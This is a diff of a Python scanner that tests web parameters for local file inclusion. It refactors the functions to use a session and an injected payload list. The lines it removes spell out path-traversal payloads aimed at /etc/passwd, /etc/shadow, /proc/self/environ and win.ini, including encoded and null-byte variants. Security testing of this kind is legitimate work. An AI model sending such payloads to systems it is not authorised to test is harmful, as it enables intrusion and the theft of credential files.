@@ -1,10 +1,8 @@
-# Path: BugHunterPro/scanners/lfi.py
-
 import requests
 import urllib.parse
 from urllib.parse import urljoin, urlparse
 
-def detect_lfi(base_url, payload, param_name="file"):
+def detect_lfi(session, base_url, payload, param_name="file"):
     """
     Detect LFI vulnerability by testing payload in URL parameter
     """
@@ -34,7 +32,7 @@ def detect_lfi(base_url, payload, param_name="file"):
             test_urls.append(test_url)
         
         # Method 3: Try direct path injection (for some APIs)
-        if not base_url.endswith('/'):
+        if not base_url.endswith("/"):
             test_urls.append(f"{base_url}/{payload}")
         else:
             test_urls.append(f"{base_url}{payload}")
@@ -42,7 +40,7 @@ def detect_lfi(base_url, payload, param_name="file"):
         # Test each URL
         for test_url in test_urls:
             try:
-                response = requests.get(test_url, timeout=10, verify=False)
+                response = session.get(test_url, timeout=10, verify=False)
                 
                 # Check for common LFI indicators
                 if check_lfi_indicators(response.text):
@@ -70,7 +68,8 @@ def check_lfi_indicators(response_text):
         "sys:x:",
         "/bin/bash",
         "/bin/sh",
-        "nobody:x:"
+        "nobody:x:",
+        "/etc/passwd"
     ]
     
     # Windows indicators
@@ -81,7 +80,8 @@ def check_lfi_indicators(response_text):
         "[fonts]",
         "[extensions]",
         "ECHO is on",
-        "Volume in drive C"
+        "Volume in drive C",
+        "[drivers]"
     ]
     
     # Check for indicators
@@ -93,52 +93,16 @@ def check_lfi_indicators(response_text):
     
     return False
 
-def scan_lfi(url):
+def scan_lfi(url, session, lfi_payloads):
     """
     Main LFI scanning function
     """
     print(f"Scanning LFI for {url}")
     
-    # Comprehensive LFI payloads
-    lfi_payloads = [
-        # Linux/Unix payloads
-        "/etc/passwd",
-        "../../../../etc/passwd",
-        "../../../etc/passwd",
-        "../../etc/passwd",
-        "../etc/passwd",
-        "/etc/shadow",
-        "/etc/group",
-        "/etc/hosts",
-        "/proc/version",
-        "/proc/self/environ",
-        
-        # Windows payloads
-        "../../../../windows/win.ini",
-        "../../../windows/win.ini",
-        "../../windows/win.ini",
-        "../windows/win.ini",
-        "../../../../windows/system32/drivers/etc/hosts",
-        "../../../windows/system32/drivers/etc/hosts",
-        "C:\\windows\\win.ini",
-        "C:\\windows\\system32\\drivers\\etc\\hosts",
-        
-        # Encoded payloads
-        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-        "..%2f..%2f..%2f..%2fetc%2fpasswd",
-        
-        # Null byte payloads (for older systems)
-        "../../../../etc/passwd%00",
-        "../../../etc/passwd%00.jpg",
-        
-        # Double encoding
-        "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
-    ]
-    
     found_lfi = False
     
     for payload in lfi_payloads:
-        if detect_lfi(url, payload):
+        if detect_lfi(session, url, payload):
             print(f"[+] LFI vulnerability found with payload: {payload}")
             found_lfi = True
             # Don't break here, continue testing to find more vulnerabilities
@@ -147,3 +111,5 @@ def scan_lfi(url):
         print("[-] No LFI vulnerabilities found.")
     
     return found_lfi
+
+
